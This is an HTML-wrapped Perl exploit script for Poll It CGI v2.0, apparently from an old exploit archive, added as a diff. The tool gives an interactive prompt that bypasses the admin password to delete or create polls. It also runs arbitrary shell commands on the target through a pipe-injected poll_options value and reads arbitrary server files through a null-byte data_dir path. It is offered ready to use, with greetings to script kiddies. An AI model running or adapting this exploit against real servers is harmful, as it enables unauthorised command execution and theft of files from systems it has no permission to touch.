@@ -1,0 +1,192 @@
+<html><head><title>Poll It CGI v2.0 exploit</title></head><pre>#!/usr/bin/perl
+
+######################################
+#                                    #
+#                                    #
+#      Poll It CGI v2.0 exploit      #
+#       keelis/havoc korp 2000       #
+#                                    #
+#    shouts to modjo, p, zen, kd,    #
+#     ab, all the script kiddies.    #
+#                                    #
+#                                    #
+#     keelis(at)hushmail(dot)com     #
+#                                    #
+#                                    #
+######################################
+
+use Socket;
+
+($host, $cgi_loc) = @ARGV[0,1];
+
+$ip=inet_aton($host);
+
+print(&quot;\n\t+---   Poll It CGI v2.0 exploit  ---+&quot;);
+print(&quot;\n\t+---    keelis/havoc korp 2000   ---+\n\n\n&quot;);
+
+usage() if (!defined($host) || !defined($cgi_loc));
+
+while(true)
+{
+	print &quot;[poll\@$host] &quot;;
+
+	$stdin = \*STDIN;
+	$cmdin = &lt;$stdin&gt;;
+
+	chomp($cmdin);
+	($cmd, $param) = split(/ /, $cmdin, 2);
+	
+	if ($cmd eq &quot;d&quot;)
+	{
+		$request = &quot;?load=admin&amp;admin_password=&amp;action=delete_poll&quot;;
+		$success_msg = &quot;current poll has been deleted\n\n&quot;;
+		make_request();
+	}
+
+	if ($cmd eq &quot;e&quot;)
+	{
+		$request = &quot;?load=admin&amp;admin_password=&amp;action=expire_poll&quot;;
+		$success_msg = &quot;current poll has been expired\n\n&quot;;
+		make_request();
+	}
+
+	if ($cmd eq &quot;c&quot;)
+	{
+		if (!defined($param))
+		{
+			print &quot;you need to specify a voting topic for the new poll\n\n&quot;;
+			next;
+		}
+
+		$request = &quot;?load=admin&amp;admin_password=&amp;action=create_new&amp;new_pollaction=1&amp;show_after=1&amp;new_title=$param&quot;;
+		$success_msg = &quot;created new poll with voting topic: \&quot;$param\&quot;\n\n&quot;;
+		make_request();
+	}
+
+	if ($cmd eq &quot;a&quot;)
+	{
+		if (!defined($param))
+		{
+			print &quot;you need to specify the text for the new voting option\n\n&quot;;
+			next;
+		}
+
+		$request = &quot;?load=admin&amp;admin_password=&amp;action=add_option&amp;add_option=$param&quot;;
+		$success_msg = &quot;voting option added to current poll: \&quot;$param\&quot;\n\n&quot;;
+		make_request();
+	}
+
+	if ($cmd eq &quot;g&quot;)
+	{
+		if (!defined($param))
+		{
+			print &quot;you need to specify the command to be run\n\n&quot;;
+			next;
+		}
+
+		$request = &quot;?load=admin&amp;admin_password=&amp;action=add_option&amp;add_option=none&amp;poll_options=$param%7C&quot;;
+		$success_msg = &quot;command has been run on remote server: \&quot;$param\&quot;\n\n&quot;;
+		make_request();
+	}
+
+	if ($cmd eq &quot;r&quot;)
+	{
+		if (!defined($param))
+		{
+			print &quot;you need to specify the file to be read\n\n&quot;;
+			next;
+		}
+
+		$request = &quot;?load=admin&amp;data_dir=$param%00&quot;;
+		$success_msg = &quot;contents of \&quot;$param\&quot; follow:\n\n&quot;;
+		make_request();
+	}
+
+	if ($cmd eq &quot;?&quot; || $cmd eq &quot;h&quot; || $cmd eq &quot;help&quot;)
+	{
+		print &quot;\n? \t\tshow this help screen\n&quot;;
+		print &quot;d \t\tdelete current poll\n&quot;;
+		print &quot;e \t\texpire current poll\n&quot;;
+		print &quot;c &lt;param&gt;\tcreate new poll using &lt;param&gt; as topic\n&quot;;
+		print &quot;a &lt;param&gt;\tadd &lt;param&gt; to voting options\n&quot;;
+		print &quot;r &lt;param&gt;\tread the file &lt;param&gt; in remote server\n&quot;;
+		print &quot;g &lt;param&gt;\trun &lt;param&gt; in the remote server\n&quot;;
+		print &quot;x \t\texit pollex.pl shell\n\n&quot;;
+		next;
+	}
+
+	if ($cmd eq &quot;x&quot;)
+	{
+		print &quot;\n&quot;;
+		last;
+	}
+
+	print &quot;command not found. use \&quot;?\&quot; for help screen.\n\n&quot;;
+}
+
+sub make_request {
+	$request=~s/ /+/g;
+	$request=~s/\\/%5C/g;
+	$request=~s/\//%2F/g;
+
+	my @req=sendraw(&quot;GET $cgi_loc$request HTTP/1.1\r\nHost: $host\r\n\r\n&quot;);
+	$reqanswer=join('', @req);
+
+	($httpv, $httpcode) = split(/ /, $reqanswer);
+	$httpcode = substr($httpcode, 0, 3);
+
+	if ($httpcode eq &quot;200&quot;) {
+		print $success_msg if ($cmd ne &quot;r&quot;);
+	} else {
+		if ($httpcode ne &quot;404&quot;)
+		{
+			print &quot;httpd returned an error code:\n\n&quot;;
+			print $reqanswer,&quot;\n&quot;;
+		} else {
+			die &quot;unexpected httpd error code 404. aborting...\n\n&quot;
+		}
+	}
+
+
+	if ($cmd eq &quot;r&quot;)
+	{	$reqanswer=substr($reqanswer, index($reqanswer, &quot;\r\n\r\n&quot;)+4);
+
+		if (substr($reqanswer, 6, 15) eq &quot;Template : File&quot;)
+		{
+			print &quot;file \&quot;$param\&quot; not found or non-readable from cgi\n\n&quot;;
+		} else {
+			print $success_msg;
+			print $reqanswer,&quot;\n&quot;;
+		}
+	}
+
+	next;
+}
+
+sub usage {
+	print &quot;Usage:  pollex.pl &lt;host&gt; &lt;cgi_loc&gt;\n\n&quot;;
+	print &quot;\thost   :\thost/ip where CGI resides\n&quot;;
+	print &quot;\tcgi_loc:\tpath to the CGI (non-SSI version needed)\n\n&quot;;
+	exit(0);
+}
+
+sub sendraw {
+        my ($pstr)=@_;
+
+        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
+                die(&quot;socket problems... aborting.\n&quot;);
+
+        if(connect(S,pack &quot;SnA4x8&quot;,2,80,$ip)){
+                select(S);
+                $|=1;
+                print $pstr;
+                my @in=&lt;S&gt;; 
+                select(STDOUT);
+	        close(S); 
+                return @in;
+        } else {
+		die(&quot;can\'t connect... aborting.\n&quot;);
+	}
+}
+
+# milw0rm.com [2000-11-15]</pre></html>
